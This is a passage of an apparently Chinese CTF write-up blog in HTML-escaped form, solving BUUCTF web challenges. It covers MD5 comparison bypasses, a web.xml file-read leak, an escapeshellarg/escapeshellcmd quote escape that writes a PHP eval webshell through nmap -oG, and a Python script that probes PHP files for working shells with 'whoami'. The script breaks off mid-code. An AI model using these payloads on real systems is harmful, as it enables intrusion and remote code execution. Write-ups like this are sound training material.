       &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file))&amp;#123;  &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file); &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;  &lt;br&gt;    &amp;#125;  &lt;br&gt;&amp;#125;  &lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;直接构造 payload 就可以拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf2020easy-md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020easy-md5&#34;&gt;#&lt;/a&gt; [BJDCTF2020]Easy MD5&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;抓包，在 header 部分拿到 hint：”select * from ‘admin’ where password=md5 ($pass,true)“，之前遇到过，输入密码”ffifdyop“，跳转到  levels91.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$a = $GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$b = $_GET[&amp;#x27;b&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    // wow, glzjin wants a girl friend.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;?a=s155964671a&amp;amp;b=s878926199a 跳转到 levell14.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;]!==&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]&amp;amp;&amp;amp;md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;])===md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;强类型比较，但是 php 中 MD5（数组）将会返回 NULL，因此 POST &lt;code&gt;param1[]=1&amp;amp;param2[]=2&lt;/code&gt;  即可拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;roarctf-2019easy-java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf-2019easy-java&#34;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Java&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;WEB-INF/web.xml 泄露，&lt;a href=&#34;https://blog.csdn.net/wy_97/article/details/78165051&#34;&gt;https://blog.csdn.net/wy_97/article/details/78165051&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;修改请求方法？filename=WEB-INF/web.xml 可以看到”/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag “&lt;/li&gt;
&lt;li&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class 其中有一段 base64 编码，解码拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;buuctf-2018online-tool&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuctf-2018online-tool&#34;&gt;#&lt;/a&gt; [BUUCTF 2018]Online Tool&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;];&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellarg(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellcmd(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt; = md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;glzjin&amp;quot;&lt;/span&gt;. &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;]);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;you are in sandbox &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;;&lt;br&gt;    @mkdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    chdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;考点应该是 bypass  escapeshellarg 和 escapeshellcmd 以及参数注入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nmap 的参数注入的话有一个 &lt;code&gt;-oG&lt;/code&gt;  或者 &lt;code&gt;-oN&lt;/code&gt;  或者 &lt;code&gt;-o&lt;/code&gt;  都可以进行写文件操作，接下来就是如何绕过两个函数了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD&#34;&gt;https://mochazz.github.io/2018/07/30 / 代码审计 Day5 - escapeshellarg 与 escapeshellcmd 使用不当 /# 结语&lt;/a&gt;](&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5&#34;&gt;https://mochazz.github.io/2018/07/30 / 代码审计 Day5&lt;/a&gt; - escapeshellarg 与 escapeshellcmd 使用不当 /# 结语)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/164/&#34;&gt;https://paper.seebug.org/164/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看到了这两个函数公用导致的引号逃逸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来就是调试 payload 了，引号这个东西有点难调试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后 payload &lt;code&gt;?host=&#39; &amp;lt;?php @eval($_POST[&amp;quot;flag&amp;quot;]);?&amp;gt; -oG flag.php &#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;强网杯-2019高明的黑客&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#强网杯-2019高明的黑客&#34;&gt;#&lt;/a&gt; [强网杯 2019] 高明的黑客&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码中有几千个 shell，但是基本都是不能用的，也就是需要我们用脚本找出可以用的 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;刚开始写了个垃圾单线程脚本，跑应该是跑的出来的，就是可能要挺久&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后尝试写了个多线程的脚本，但是一个一个遍历参数，估计也是要好久&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网上看到一个比较好的脚本，一个文件只访问一次，把所有参数一次都传过去这样就减少了大部分的请求，在确认某一个文件存在 shell 之后再遍历所有参数来找到可用参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; re&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; threading&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;开始时间：  &amp;#x27;&lt;/span&gt;+  time.asctime( time.localtime(time.time()) ))&lt;br&gt;s1=threading.Semaphore(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;)  							  			&lt;span class=&#34;hljs-comment&#34;&gt;#这儿设置最大的线程数&lt;/span&gt;&lt;br&gt;filePath = &lt;span class=&#34;hljs-string&#34;&gt;r&amp;quot;D:/phpstudy_pro/WWW/src&amp;quot;&lt;/span&gt;&lt;br&gt;os.chdir(filePath)													&lt;span class=&#34;hljs-comment&#34;&gt;#改变当前的路径&lt;/span&gt;&lt;br&gt;requests.adapters.DEFAULT_RETRIES = &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;								&lt;span class=&#34;hljs-comment&#34;&gt;#设置重连次数，防止线程数过高，断开连接&lt;/span&gt;&lt;br&gt;files = os.listdir(filePath)&lt;br&gt;session = requests.Session()&lt;br&gt;session.keep_alive = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;											 &lt;span class=&#34;hljs-comment&#34;&gt;# 设置连接活跃状态为False&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_content&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;file&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    s1.acquire()												&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;trying   &amp;#x27;&lt;/span&gt;+file+ &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;     &amp;#x27;&lt;/span&gt;+ time.asctime( time.localtime(time.time()) ))&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(file,encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; f:							&lt;span class=&#34;hljs-comment&#34;&gt;#打开php文件，提取所有的$_GET和$_POST的参数&lt;/span&gt;&lt;br&gt;            gets = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_GET\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;            posts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_POST\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;    data = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#所有的$_POST&lt;/span&gt;&lt;br&gt;    params = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#所有的$_GET&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;        params[m] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;        data[n] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;http://127.0.0.1/src/&amp;#x27;&lt;/span&gt;+file&lt;br&gt;    req = session.post(url, data=data, params=params)			&lt;span class=&#34;hljs-comment&#34;&gt;#一次性请求所有的GET和POST&lt;/span&gt;&lt;br&gt;    req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# 关闭请求  释放内存&lt;/span&gt;&lt;br&gt;    req.encoding = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;br&gt;    content = req.text&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;#print(content)&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:									&lt;span class=&#34;hljs-comment&#34;&gt;#如果发现有可以利用的参数，继续筛选出具体的参数&lt;/span&gt;&lt;br&gt;        flag = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; a &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;            req = session.get(url+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?%s=&amp;#x27;&lt;/span&gt;%a+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;)&lt;br&gt;            content = req.text&lt;br&gt;            req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# 关闭请求  释放内存&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                flag = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag != &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;                req = session.post(url, data=&amp;#123;b:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&amp;#125;)&lt;br&gt;                content = req.text&lt;br&gt;                req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# 关闭请求  释放内存&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag == &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:													&lt;span class=&#34;hljs-comment&#34;&gt;#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，&lt;/span&gt;&lt;br&gt;            param = a&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            param = b&lt;br&gt;        